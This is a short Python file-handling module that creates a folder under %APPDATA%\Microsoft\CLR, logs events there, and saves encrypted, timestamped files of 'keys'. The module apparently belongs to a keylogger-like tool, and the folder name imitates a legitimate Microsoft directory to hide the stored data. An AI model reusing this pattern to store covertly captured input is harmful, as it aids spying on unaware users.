'''
Input/Output Module contains shared function related to file handling
'''

import os
import Helper,Encrypt

def getThePath(delimiter=False):
	# get the path
	path = os.getenv('APPDATA')
	newpath = os.path.join(path,'Microsoft','CLR')
	return newpath
def logEvent(eventDetails):
	# log event in applog.txt
	path = getThePath()
	makeDirRev(path)
	with open(os.path.join(path,'applog.txt'),'a') as f:
		f.write(eventDetails+'\n')
	
	

def makeDirRev(path):
	# make the provided directory (including the parent directories)
	os.makedirs(path,exist_ok=True)
	

def check_file(path):
	# check if the path provided is a file path
	return os.path.isfile(path)

def check_dir(path):
	# check if the path provided is a file path
	return os.path.isdir(path)

def saveKeys(data):
	# save the keys after encrypting them
	try:
		path = getThePath()
		makeDirRev(path)
		name = Helper.getDateTimeString('_')
		with open(os.path.join(path,name+'.txt'),'w') as f:
			encrypted = Encrypt.encrypt(data)
			f.write(encrypted+'\n')
		return (name,path)
	except Exception:
		logEvent(f"{Helper.getDateTimeString()}: <Problem in Io.SaveKeys>")
		return(1,1)
